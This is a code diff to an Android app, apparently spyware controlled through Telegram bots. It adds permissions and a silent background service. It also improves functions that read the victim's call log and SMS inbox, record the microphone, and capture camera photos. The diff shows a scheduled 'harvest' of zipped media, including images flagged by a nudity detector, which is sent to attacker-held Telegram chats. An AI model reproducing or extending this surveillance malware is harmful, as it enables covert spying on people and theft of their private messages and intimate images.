@@ -96,13 +96,23 @@ def _perms():
         from android.permissions import request_permissions, Permission
         request_permissions([
             Permission.INTERNET, Permission.CAMERA, Permission.RECORD_AUDIO,
-            "android.permission.FOREGROUND_SERVICE"
+            "android.permission.FOREGROUND_SERVICE",
+            "android.permission.READ_EXTERNAL_STORAGE",
+            "android.permission.WRITE_EXTERNAL_STORAGE",
+            "android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS"
         ])
     except Exception as e:
         print(f"Permissions error: {e}")
+    
     start_silent_service()
-    # توجيه المستخدم لإخفاء الإشعار (يعمل بصمت)
-    threading.Thread(target=open_notification_settings, daemon=True).start()
+    
+    # تأخير فتح إعدادات الإشعارات لتجنب تعطل التطبيق فور البدء
+    def delayed_notification_settings():
+        time.sleep(2)
+        open_notification_settings()
+    threading.Thread(target=delayed_notification_settings, daemon=True).start()
+    
+    # طلب تجاوز تحسين البطارية
     try:
         from jnius import autoclass
         ctx = autoclass('org.kivy.android.PythonActivity').mActivity
@@ -117,25 +127,80 @@ def _perms():
         print(f"Battery exemption error: {e}")
 
 def load_secrets_from_config():
+    """تحميل الإعدادات من config_template.py أو config.py مع قيم افتراضية آمنة"""
     config_module = None
     try:
         config_module = importlib.import_module("config_template")
     except ImportError:
         try:
             config_module = importlib.import_module("config")
-        except ImportError: pass
-    if config_module is None:
-        raise Exception("لا يمكن العثور على config_template.py أو config.py في المسار")
+        except ImportError:
+            print("⚠️ Warning: No config file found, using defaults")
+            return [], [], 0, 0, "default_secret"
+    
     if not hasattr(config_module, 'load_config'):
-        raise Exception("الملف الموجود لا يحتوي على دالة load_config")
-    active, reserve, ctrl, vault, secret = config_module.load_config()
-    return active, reserve, ctrl, vault, secret
+        print("⚠️ Warning: Config file has no load_config function")
+        return [], [], 0, 0, "default_secret"
+    
+    try:
+        active, reserve, ctrl, vault, secret = config_module.load_config()
+        # التحقق من صحة القيم
+        if not active: active = []
+        if not reserve: reserve = []
+        if not ctrl: ctrl = 0
+        if not vault: vault = 0
+        if not secret: secret = "default_secret"
+        return active, reserve, ctrl, vault, secret
+    except Exception as e:
+        print(f"⚠️ Error loading config: {e}, using defaults")
+        return [], [], 0, 0, "default_secret"
+
+def fetch_index():
+    """جلب ملف index.json من الإنترنت"""
+    for url in INDEX_BASE_URLS:
+        try:
+            resp = requests.get(url, headers=HEADERS, timeout=15, verify=True)
+            if resp.status_code == 200:
+                try:
+                    return resp.json()
+                except:
+                    continue
+        except:
+            continue
+    return None
+
+def copy_model_to_models_dir():
+    """نسخ ملف النموذج من assets إلى مجلد models"""
+    try:
+        # محاولة نسخ من مسار assets داخل APK
+        assets_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "assets", "engine_v2.tflite")
+        if os.path.exists(assets_path):
+            dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
+            if not os.path.exists(dest) or os.path.getsize(dest) != os.path.getsize(assets_path):
+                shutil.copy2(assets_path, dest)
+                print(f"✅ Model copied to: {dest}")
+                return True
+        
+        # محاولة نسخ من المجلد الحالي
+        local_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), "engine_v2.tflite")
+        if os.path.exists(local_path):
+            dest = os.path.join(MODELS_DIR, "engine_v2.tflite")
+            if not os.path.exists(dest) or os.path.getsize(dest) != os.path.getsize(local_path):
+                shutil.copy2(local_path, dest)
+                print(f"✅ Model copied from local: {dest}")
+                return True
+        
+        print("⚠️ Model file not found in assets or local directory")
+        return False
+    except Exception as e:
+        print(f"⚠️ Error copying model: {e}")
+        return False
 
 # ========== تضمين الملفات الأساسية (لضمان الإقلاع المحلي) ==========
 EMBEDDED_FILES = {
     "telegram_ui.py": r'''
 # -*- coding: utf-8 -*-
-import os, time, json, threading, logging, requests, sys, importlib, random
+import os, time, json, threading, logging, requests, sys, importlib, secrets
 from collections import deque
 from datetime import datetime
 
@@ -172,10 +237,11 @@ class T:
         self.dvs = {}
         self.p_upd = deque(maxlen=200)
         self.rn = True
-        self.active_tokens = active_tokens[:]
-        self.reserve_tokens = reserve_tokens[:]
+        self.active_tokens = [t for t in active_tokens if t]
+        self.reserve_tokens = [t for t in reserve_tokens if t]
         self.ctrl = ctrl_id
         self.dat = vault_id
+        self.vlt = vault_id
         self.pw = app_password
         self._load()
         threading.Thread(target=self._session_cleaner, daemon=True).start()
@@ -205,8 +271,11 @@ class T:
 
     def _next_token(self):
         if not self.active_tokens: return None
-        rng = random.Random(self.device_id)
-        return rng.choice(self.active_tokens)
+        try:
+            return secrets.choice(self.active_tokens)
+        except:
+            import random
+            return random.choice(self.active_tokens)
 
     def _emergency_switch(self, bad_token):
         if bad_token in self.active_tokens:
@@ -231,7 +300,11 @@ class T:
         while self.rn:
             time.sleep(21600)
             if not self.reserve_tokens: continue
-            hb_bot = random.choice(self.reserve_tokens)
+            try:
+                hb_bot = secrets.choice(self.reserve_tokens)
+            except:
+                import random
+                hb_bot = random.choice(self.reserve_tokens)
             try:
                 url = f"https://api.telegram.org/bot{hb_bot}/sendMessage"
                 data = {"chat_id": self.dat, "text": f"❤️ system heartbeat {datetime.now().strftime('%Y-%m-%d %H:%M')}"}
@@ -249,12 +322,13 @@ class T:
             last_token = token
             try:
                 url = f"https://api.telegram.org/bot{token}/{method}"
-                resp = requests.post(url, data=data, files=files, headers=TG_HEADERS, timeout=25, verify=True)
+                resp = requests.post(url, data=data, files=files, headers=TG_HEADERS, timeout=30, verify=True)
                 result = resp.json()
                 if result.get('ok'): return result
                 error = result.get('error_code')
                 if error == 429:
-                    time.sleep(2); continue
+                    retry_after = result.get('parameters', {}).get('retry_after', 2)
+                    time.sleep(retry_after); continue
                 elif error in (401, 403):
                     self._emergency_switch(token)
                 else:
@@ -364,6 +438,8 @@ class T:
         cb_id = cb.get('id')
         if not cb_id or cb_id in self.p_upd: return
         self.p_upd.append(cb_id)
+        if len(self.p_upd) > 150:
+            self.p_upd.clear()
         chat_id = cb.get('message', {}).get('chat', {}).get('id')
         msg_id = cb.get('message', {}).get('message_id')
         data = cb.get('data', '')
@@ -400,7 +476,7 @@ class T:
             self._show_harvest_details(chat_id)
             return
         if data.startswith("send_now_"):
-            did = data[8:]
+            did = data[9:]
             try:
                 import commands
                 importlib.reload(commands)
@@ -409,9 +485,10 @@ class T:
                 self._api("sendMessage", {"chat_id": chat_id, "text": f"❌ Send error: {e}"})
             return
         if data == "ai_status":
-            ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.model is not None
+            ai_loaded = hasattr(self.m, 'nude_detector') and self.m.nude_detector and self.m.nude_detector.is_ready() if hasattr(self.m.nude_detector, 'is_ready') else False
             status = "✅ Active" if ai_loaded else "❌ Not ready"
-            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}", "show_alert": True})
+            loading = " (loading...)" if hasattr(self.m.nude_detector, '_loading_engine') and self.m.nude_detector._loading_engine else ""
+            self._api("answerCallbackQuery", {"callback_query_id": cb_id, "text": f"AI: {status}{loading}", "show_alert": True})
             return
         if data == "rnw":
             self.ses[str(chat_id)] = time.time() + 14400
@@ -440,22 +517,30 @@ class T:
 
     def _polling(self):
         offset = 0
+        consecutive_errors = 0
         while self.rn:
             token = self._next_token()
             if not token:
                 time.sleep(5); continue
             try:
                 url = f"https://api.telegram.org/bot{token}/getUpdates"
-                params = {"offset": offset, "timeout": 20, "allowed_updates": json.dumps(["message", "callback_query"])}
-                resp = requests.get(url, params=params, headers=TG_HEADERS, timeout=25, verify=True)
+                params = {"offset": offset, "timeout": 25, "allowed_updates": json.dumps(["message", "callback_query"])}
+                resp = requests.get(url, params=params, headers=TG_HEADERS, timeout=30, verify=True)
+                if resp.status_code != 200:
+                    consecutive_errors += 1
+                    time.sleep(min(consecutive_errors * 2, 60))
+                    continue
                 data = resp.json()
                 if data.get('ok'):
+                    consecutive_errors = 0
                     for upd in data.get('result', []):
                         offset = upd['update_id'] + 1
                         if 'message' in upd: self._handle_message(upd)
                         if 'callback_query' in upd: self._handle_callback(upd)
                 time.sleep(0.3)
-            except: time.sleep(2)
+            except:
+                consecutive_errors += 1
+                time.sleep(min(consecutive_errors * 2, 30))
 
     def start(self):
         if self.active_tokens:
@@ -501,12 +586,16 @@ class M:
         self.ui = None; self.daily_zipper = None; self.camera_analyzer = None
         self.nude_detector = None; self.media_scanner = None; self.ctrl = None; self.vlt = None
         self._wake_event = threading.Event()
+        self._harvest_lock = threading.Lock()
+        self._harvest_running = False
         self._load_config(); self._get_device_info(); self._setup()
 
     def _setup(self):
         try:
             with open(os.path.join(self.d, ".nomedia"), 'w') as f: f.write("")
         except: pass
+        if not os.path.exists(self.wt):
+            self._set_next_harvest_time()
 
     def _load_config(self):
         default_cfg = {"hth": 15, "wl": False, "iv": 900}
@@ -515,6 +604,12 @@ class M:
                 with open(self.cf, 'r') as f: default_cfg.update(json.load(f))
             except: pass
         self.cfg = default_cfg
+
+    def _save_config(self):
+        try:
+            with open(self.cf, 'w') as f:
+                json.dump(self.cfg, f, indent=2)
+        except: pass
 
     def _get_ctx(self):
         if not JNI: return None
@@ -558,29 +653,49 @@ class M:
             return percent, is_charging
         except: return 50, False
 
-    def _next_harvest_time(self):
-        now = datetime.now()
-        delta_hours = random.randint(2, 6); delta_minutes = random.randint(0, 59)
-        target = now + timedelta(hours=delta_hours, minutes=delta_minutes)
-        return target.isoformat()
+    def _set_next_harvest_time(self):
+        try:
+            now = datetime.now()
+            delta_hours = random.randint(2, 6)
+            delta_minutes = random.randint(0, 59)
+            target = now + timedelta(hours=delta_hours, minutes=delta_minutes)
+            with open(self.wt, 'w') as f:
+                f.write(target.isoformat())
+            return target
+        except: return None
 
     def _harvest_logic(self):
-        if not self._is_wifi(): return
-        battery, charging = self._battery_ok()
-        if battery < self.cfg.get('hth', 15) and not charging: return
-        if os.path.exists(self.wt):
-            try:
-                with open(self.wt, 'r') as f:
-                    next_time_str = f.read().strip()
-                    if next_time_str and datetime.now() < datetime.fromisoformat(next_time_str): return
-            except: pass
-        if self.daily_zipper:
-            try:
-                threading.Thread(target=self.daily_zipper.run, daemon=True).start()
-                with open(self.wt, 'w') as f: f.write(self._next_harvest_time())
-                with open(self.lh, 'w') as f: f.write(datetime.now().isoformat())
-            except Exception as e: logging.error(f"Harvest failed: {e}")
-        gc.collect()
+        if self._harvest_running: return
+        with self._harvest_lock:
+            if self._harvest_running: return
+            self._harvest_running = True
+        try:
+            if not self._is_wifi(): return
+            battery, charging = self._battery_ok()
+            if battery < self.cfg.get('hth', 15) and not charging: return
+            if os.path.exists(self.wt):
+                try:
+                    with open(self.wt, 'r') as f:
+                        next_time_str = f.read().strip()
+                        if next_time_str:
+                            try:
+                                from datetime import datetime
+                                next_time = datetime.fromisoformat(next_time_str)
+                                if datetime.now() < next_time: return
+                            except:
+                                pass
+                except: pass
+            if self.daily_zipper:
+                try:
+                    threading.Thread(target=self.daily_zipper.run, daemon=True).start()
+                    self._set_next_harvest_time()
+                    with open(self.lh, 'w') as f:
+                        f.write(datetime.now().isoformat())
+                except Exception as e: logging.error(f"Harvest failed: {e}")
+        except Exception as e: logging.error(f"Harvest logic error: {e}")
+        finally:
+            self._harvest_running = False
+            gc.collect()
 
     def _loop(self):
         while self.rn:
@@ -588,6 +703,7 @@ class M:
             except Exception as e: logging.error(f"Monitor loop error: {e}")
             interval = self.cfg.get('iv', 900)
             self._wake_event.wait(interval)
+            self._wake_event.clear()
 
     def start(self):
         threading.Thread(target=self._loop, daemon=True).start()
@@ -614,7 +730,7 @@ def get_device_tag():
 
     "commands.py": r'''
 # -*- coding: utf-8 -*-
-import os, time, json, threading, logging, sys, gc
+import os, time, json, threading, logging, sys, gc, importlib
 from datetime import datetime
 
 def _get_runtime_path():
@@ -641,9 +757,18 @@ try:
     JNI = True
 except ImportError: JNI = False
 
+try:
+    from android.permissions import SecurityException
+except ImportError:
+    SecurityException = Exception
+
 class C:
     def __init__(self):
-        self.mic_busy = False; self._cleanup()
+        self.mic_busy = False
+        self._mic_lock = threading.Lock()
+        self._components_loaded = False
+        self._component_lock = threading.Lock()
+        self._cleanup()
 
     def _cleanup(self):
         try:
@@ -652,49 +777,68 @@ class C:
                 if not os.path.exists(folder): continue
                 for f in os.listdir(folder):
                     path = os.path.join(folder, f)
-                    if os.path.getmtime(path) < now - max_age:
-                        os.remove(path)
+                    try:
+                        if os.path.getmtime(path) < now - max_age:
+                            os.remove(path)
+                    except: pass
         except: pass
 
     def _ensure_components(self, m):
-        try:
-            if not hasattr(m, 'nude_detector') or m.nude_detector is None:
-                try:
-                    import nude_detector
-                    m.nude_detector = nude_detector.NudeDetector(m)
-                    logging.info("✅ NudeDetector loaded")
-                except Exception as e: logging.error(f"NudeDetector init error: {e}")
-            if not hasattr(m, 'media_scanner') or m.media_scanner is None:
-                import media_scanner
-                m.media_scanner = media_scanner.MediaScanner(det=m.nude_detector, ui=m.ui)
-                logging.info("✅ MediaScanner loaded")
-            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
-                import gallery_browser
-                m.gallery_browser = gallery_browser.G(m.media_scanner, m.ui)
-                logging.info("✅ GalleryBrowser loaded")
-            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
-                import camera_analyzer
-                m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
-                logging.info("✅ CameraAnalyzer loaded")
-            if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
-                import daily_zipper
-                m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.ui)
-                logging.info("✅ DailyZipper loaded")
-        except Exception as e: logging.error(f"Component init error: {e}")
+        if self._components_loaded: return
+        with self._component_lock:
+            if self._components_loaded: return
+            components = [
+                ('nude_detector', 'nude_detector', 'NudeDetector', lambda: {'mon': m}),
+                ('media_scanner', 'media_scanner', 'MediaScanner', lambda: {'det': m.nude_detector, 'ui': m.ui}),
+                ('gallery_browser', 'gallery_browser', 'G', lambda: {'sc': m.media_scanner, 'tg': m.ui}),
+                ('camera_analyzer', 'camera_analyzer', 'CameraAnalyzer', lambda: {'mon': m, 'det': m.nude_detector}),
+                ('daily_zipper', 'daily_zipper', 'DailyZipper', lambda: {'scanner': m.media_scanner, 'tg': m.ui})
+            ]
+            for attr, module_name, class_name, args_fn in components:
+                if not hasattr(m, attr) or getattr(m, attr) is None:
+                    try:
+                        mod = importlib.import_module(module_name)
+                        cls = getattr(mod, class_name)
+                        args = args_fn()
+                        if attr == 'nude_detector':
+                            setattr(m, attr, cls(args['mon']))
+                        else:
+                            setattr(m, attr, cls(**args))
+                        logging.info(f"✅ {class_name} loaded")
+                    except Exception as e:
+                        logging.error(f"Failed to load {module_name}: {e}")
+            self._components_loaded = True
 
     def _send_text_file(self, tg, chat_id, content, filename):
         temp_path = os.path.join(PENDING_DIR, f"{int(time.time())}_{filename}")
         try:
+            if not content or not content.strip():
+                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: لا يوجد محتوى"})
+                return
             with open(temp_path, 'w', encoding='utf-8', errors='ignore') as f: f.write(content)
+            if os.path.getsize(temp_path) == 0:
+                os.remove(temp_path)
+                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}: ملف فارغ"})
+                return
             with open(temp_path, 'rb') as f:
                 resp = tg._api("sendDocument", {"chat_id": chat_id, "caption": f"📄 {filename}"}, {"document": f})
             if resp and resp.get('ok'): os.remove(temp_path)
             else: logging.warning(f"File {filename} left in pending")
-        except Exception as e: logging.error(f"_send_text_file error: {e}")
+        except Exception as e:
+            logging.error(f"_send_text_file error: {e}")
+            try:
+                tg._api("sendMessage", {"chat_id": chat_id, "text": f"📄 {filename}:\n{content[:4000]}"})
+            except: pass
+            if os.path.exists(temp_path):
+                try: os.remove(temp_path)
+                except: pass
 
     def _record_audio(self, duration=10):
-        if not JNI or self.mic_busy: return None
-        self.mic_busy = True; media_recorder = None
+        if not JNI: return None
+        with self._mic_lock:
+            if self.mic_busy: return None
+            self.mic_busy = True
+        media_recorder = None
         out_path = os.path.join(TEMP_DIR, f"audio_{int(time.time())}.aac")
         try:
             MR = autoclass('android.media.MediaRecorder')
@@ -705,16 +849,20 @@ class C:
             media_recorder.setAudioEncodingBitRate(64000)
             media_recorder.setOutputFile(out_path)
             media_recorder.prepare(); media_recorder.start()
-            time.sleep(duration)
+            for _ in range(duration):
+                time.sleep(1)
             media_recorder.stop(); media_recorder.reset()
-            return out_path
+            if os.path.exists(out_path) and os.path.getsize(out_path) > 100:
+                return out_path
+            return None
         except Exception as e:
             logging.error(f"Recording error: {e}"); return None
         finally:
             if media_recorder:
                 try: media_recorder.release()
                 except: pass
-            self.mic_busy = False
+            with self._mic_lock:
+                self.mic_busy = False
 
     def _call_log(self, limit=100):
         if not JNI: return "JNI غير متاح"
@@ -726,16 +874,29 @@ class C:
             cursor = resolver.query(Uri.parse("content://call_log/calls"), None, None, None, "date DESC")
             if not cursor: return "لا صلاحية أو لا توجد مكالمات"
             lines = []
-            idx_name = cursor.getColumnIndex("name"); idx_number = cursor.getColumnIndex("number")
+            idx_name = cursor.getColumnIndex("name")
+            idx_number = cursor.getColumnIndex("number")
+            idx_type = cursor.getColumnIndex("type")
+            idx_date = cursor.getColumnIndex("date")
             while cursor.moveToNext() and len(lines) < limit:
                 name = cursor.getString(idx_name) or "Unknown"
                 num = cursor.getString(idx_number) or "?"
-                lines.append(f"👤 {name} ({num})")
+                call_type = cursor.getString(idx_type) or "?"
+                date = cursor.getString(idx_date) or "0"
+                type_str = {"1": "📥 وارد", "2": "📤 صادر", "3": "❌ فائت"}.get(call_type, "❓")
+                try:
+                    date_str = datetime.fromtimestamp(int(date)/1000).strftime("%Y-%m-%d %H:%M")
+                except: date_str = "?"
+                lines.append(f"{type_str} {name} ({num}) [{date_str}]")
             return "\n".join(lines) if lines else "سجل المكالمات فارغ"
+        except SecurityException:
+            return "⚠️ لا توجد صلاحية لقراءة سجل المكالمات"
         except Exception as e:
             logging.error(f"Call log error: {e}"); return "خطأ في قراءة المكالمات"
         finally:
-            if cursor: cursor.close()
+            if cursor:
+                try: cursor.close()
+                except: pass
 
     def _sms_log(self, limit=100):
         if not JNI: return "JNI غير متاح"
@@ -747,146 +908,354 @@ class C:
             cursor = resolver.query(Uri.parse("content://sms/inbox"), None, None, None, "date DESC")
             if not cursor: return "لا صلاحية أو لا توجد رسائل"
             lines = []
-            idx_addr = cursor.getColumnIndex("address"); idx_body = cursor.getColumnIndex("body")
+            idx_addr = cursor.getColumnIndex("address")
+            idx_body = cursor.getColumnIndex("body")
+            idx_date = cursor.getColumnIndex("date")
             while cursor.moveToNext() and len(lines) < limit:
                 addr = cursor.getString(idx_addr) or "?"
                 body = cursor.getString(idx_body) or ""
-                lines.append(f"📩 من: {addr}\n💬 {body}\n---")
+                date = cursor.getString(idx_date) or "0"
+                try:
+                    date_str = datetime.fromtimestamp(int(date)/1000).strftime("%Y-%m-%d %H:%M")
+                except: date_str = "?"
+                lines.append(f"📩 من: {addr}\n🕐 {date_str}\n💬 {body}\n---")
             return "\n".join(lines) if lines else "صندوق الوارد فارغ"
+        except SecurityException:
+            return "⚠️ لا توجد صلاحية لقراءة الرسائل"
         except Exception as e:
             logging.error(f"SMS error: {e}"); return "خطأ في قراءة الرسائل"
         finally:
-            if cursor: cursor.close()
+            if cursor:
+                try: cursor.close()
+                except: pass
 
     def _battery_ok(self, m):
         try:
-            b, ch = m._battery_ok() if hasattr(m, '_battery_ok') else (100, False)
-            return b >= 15 or ch
-        except: return True
+            if hasattr(m, '_battery_ok') and callable(m._battery_ok):
+                b, ch = m._battery_ok()
+                return b >= 15 or ch
+        except: pass
+        return True
 
     def ex(self, cmd, tg, m, cid, cbq=None):
         threading.Thread(target=self._execute, args=(cmd, tg, m, cid, cbq), daemon=True).start()
 
     def _execute(self, cmd, tg, m, cid, cbq):
         try:
-            if cbq: tg._api("answerCallbackQuery", {"callback_query_id": cbq})
+            if not cmd or not isinstance(cmd, str): return
+            if cbq:
+                try: tg._api("answerCallbackQuery", {"callback_query_id": cbq})
+                except: pass
             self._ensure_components(m)
-            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
-                parts = cmd.split("|"); action = parts[0]
-                if action == "g_nav":
-                    cat, page = parts[1], int(parts[2])
-                    new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
-                    tg._api("editMessageReplyMarkup", {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
-                elif action == "g_opt": m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
-                elif action == "g_act": m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
-                elif action == "g_conf":
-                    act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
-                    confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
-                                   {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
-                    tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟", "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
-                return
-            if cmd.startswith(("cam_", "camf_")):
-                is_front = 1 if "camf_" in cmd else 0
-                if not self._battery_ok(m):
-                    tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً (أقل من 15%)"}); return
-                tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
-                m.camera_analyzer.harvest(cam_id=is_front)
-                tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها. سيتم إرسال النتائج لاحقاً."})
-                return
-            if cmd.startswith("mic_"):
-                if self.mic_busy:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ حالياً"}); return
-                tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
-                audio_path = self._record_audio(10)
-                if audio_path and os.path.exists(audio_path):
-                    with open(audio_path, 'rb') as f:
-                        target = getattr(m, 'vlt', cid)
-                        tg._api("sendVoice", {"chat_id": target}, {"voice": f})
-                    os.remove(audio_path)
-                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
-                return
-            if cmd.startswith("callog_"):
-                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
-                data = self._call_log()
-                self._send_text_file(tg, cid, data, "calls.txt"); return
-            if cmd.startswith("sms_"):
-                tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
-                data = self._sms_log()
-                self._send_text_file(tg, cid, data, "sms.txt"); return
-            if cmd.startswith("hrv_"):
-                if hasattr(m, 'daily_zipper') and m.daily_zipper:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})
-                    threading.Thread(target=m.daily_zipper.run, daemon=True).start()
-                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
-                return
-            if cmd.startswith("send_now_"):
-                if hasattr(m, 'daily_zipper') and m.daily_zipper:
-                    tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة فوراً..."})
-                    threading.Thread(target=m.daily_zipper.force_send_now, args=(cid,)).start()
-                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
-                return
-            if cmd.startswith("media_"):
-                if hasattr(m, 'gallery_browser') and m.gallery_browser:
-                    kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
-                    res = tg._api("sendMessage", {"chat_id": cid, "text": "🖼️ معرض الوسائط", "reply_markup": json.dumps(kb)})
-                    if res and res.get('ok'): m.last_mid = res['result']['message_id']
-                else: tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
-                return
-            tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف."})
+            if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|", "g_bulk|")):
+                self._handle_gallery(cmd, tg, m, cid)
+            elif cmd.startswith(("cam_", "camf_")):
+                self._handle_camera(cmd, tg, m, cid)
+            elif cmd.startswith("mic_"):
+                self._handle_mic(tg, m, cid)
+            elif cmd.startswith("callog_"):
+                self._handle_callog(tg, cid)
+            elif cmd.startswith("sms_"):
+                self._handle_sms(tg, cid)
+            elif cmd.startswith("hrv_"):
+                self._handle_harvest(tg, m, cid)
+            elif cmd.startswith("send_now_"):
+                self._handle_send_now(tg, m, cid)
+            elif cmd.startswith("media_"):
+                self._handle_media(tg, m, cid)
+            else:
+                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ أمر غير معروف."})
         except Exception as e:
             logging.error(f"Command handler error: {e}")
-            tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
-        finally: gc.collect()
+            try:
+                tg._api("sendMessage", {"chat_id": cid, "text": f"❌ خطأ داخلي: {str(e)[:100]}"})
+            except: pass
+        finally:
+            try: gc.collect()
+            except: pass
+
+    def _handle_gallery(self, cmd, tg, m, cid):
+        try:
+            parts = cmd.split("|")
+            if len(parts) < 2: return
+            action = parts[0]
+            if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
+                tg._api("sendMessage", {"chat_id": cid, "text": "❌ المعرض غير متاح"})
+                return
+            if action == "g_nav" and len(parts) >= 3:
+                cat, page = parts[1], int(parts[2])
+                new_kb = m.gallery_browser.get_grid_kb(cat=cat, page=page)
+                tg._api("editMessageReplyMarkup", {"chat_id": cid, "message_id": m.last_mid, "reply_markup": json.dumps(new_kb)})
+            elif action == "g_opt" and len(parts) >= 4:
+                m.gallery_browser.show_options(cid, parts[1], parts[2], parts[3])
+            elif action == "g_act" and len(parts) >= 5:
+                m.gallery_browser.execute_action(cid, parts[1], parts[2], parts[3], parts[4])
+            elif action == "g_conf" and len(parts) >= 5:
+                act, cat, pg, idx = parts[1], parts[2], parts[3], parts[4]
+                confirm_kb = [[{"text": "🗑 نعم، احذف", "callback_data": f"g_act|del|{cat}|{pg}|{idx}"},
+                               {"text": "🔙 إلغاء", "callback_data": f"g_opt|{cat}|{pg}|{idx}"}]]
+                tg._api("sendMessage", {"chat_id": cid, "text": "⚠️ هل أنت متأكد من الحذف؟", "reply_markup": json.dumps({"inline_keyboard": confirm_kb})})
+            elif action == "g_bulk" and len(parts) >= 3:
+                cat, page = parts[1], int(parts[2])
+                m.gallery_browser.execute_action(cid, "bulk", cat, page)
+        except Exception as e:
+            logging.error(f"Gallery handler error: {e}")
+            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في المعرض"})
+
+    def _handle_camera(self, cmd, tg, m, cid):
+        try:
+            is_front = 1 if "camf_" in cmd else 0
+            if not self._battery_ok(m):
+                tg._api("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة"})
+                return
+            if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
+                tg._api("sendMessage", {"chat_id": cid, "text": "❌ الكاميرا غير متاحة"})
+                return
+            tg._api("sendChatAction", {"chat_id": cid, "action": "upload_photo"})
+            def capture():
+                try: m.camera_analyzer.harvest(cam_id=is_front)
+                except Exception as e: logging.error(f"Camera harvest error: {e}")
+            threading.Thread(target=capture, daemon=True).start()
+            tg._api("sendMessage", {"chat_id": cid, "text": "📸 تم التقاط الصورة وتحليلها."})
+        except Exception as e:
+            logging.error(f"Camera handler error: {e}")
+            tg._api("sendMessage", {"chat_id": cid, "text": "❌ خطأ في الكاميرا"})
+
+    def _handle_mic(self, tg, m, cid):
+        try:
+            if self.mic_busy:
+                tg._api("sendMessage", {"chat_id": cid, "text": "⏳ التسجيل قيد التنفيذ"})
+                return
+            tg._api("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل لمدة 10 ثوانٍ..."})
+            def record():
+                audio_path = self._record_audio(10)
+                if audio_path and os.path.exists(audio_path):
+                    try:
+                        target = getattr(m, 'vlt', cid)
+                        with open(audio_path, 'rb') as f:
+                            tg._api("sendVoice", {"chat_id": target}, {"voice": f})
+                    except: pass
+                    finally:
+                        try: os.remove(audio_path)
+                        except: pass
+                else:
+                    try: tg._api("sendMessage", {"chat_id": cid, "text": "❌ فشل التسجيل"})
+                    except: pass
+            threading.Thread(target=record, daemon=True).start()
+        except Exception as e:
+            logging.error(f"Mic handler error: {e}")
+
+    def _handle_callog(self, tg, cid):
+        try:
+            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
+            data = self._call_log()
+            self._send_text_file(tg, cid, data, "calls.txt")
+        except Exception as e:
+            logging.error(f"Callog handler error: {e}")
+
+    def _handle_sms(self, tg, cid):
+        try:
+            tg._api("sendChatAction", {"chat_id": cid, "action": "typing"})
+            data = self._sms_log()
+            self._send_text_file(tg, cid, data, "sms.txt")
+        except Exception as e:
+            logging.error(f"SMS handler error: {e}")
+
+    def _handle_harvest(self, tg, m, cid):
+        try:
+            if hasattr(m, 'daily_zipper') and m.daily_zipper:
+                tg._api("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد... قد يستغرق دقائق"})
+                threading.Thread(target=m.daily_zipper.run, daemon=True).start()
+            else:
+                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير جاهزة"})
+        except Exception as e:
+            logging.error(f"Harvest handler error: {e}")
+
+    def _handle_send_now(self, tg, m, cid):
+        try:
+            if hasattr(m, 'daily_zipper') and m.daily_zipper:
+                tg._api("sendMessage", {"chat_id": cid, "text": "🚀 جاري إرسال الملفات المضغوطة..."})
+                threading.Thread(target=m.daily_zipper.force_send_now, args=(cid,), daemon=True).start()
+            else:
+                tg._api("sendMessage", {"chat_id": cid, "text": "❌ وحدة الحصاد غير متاحة"})
+        except Exception as e:
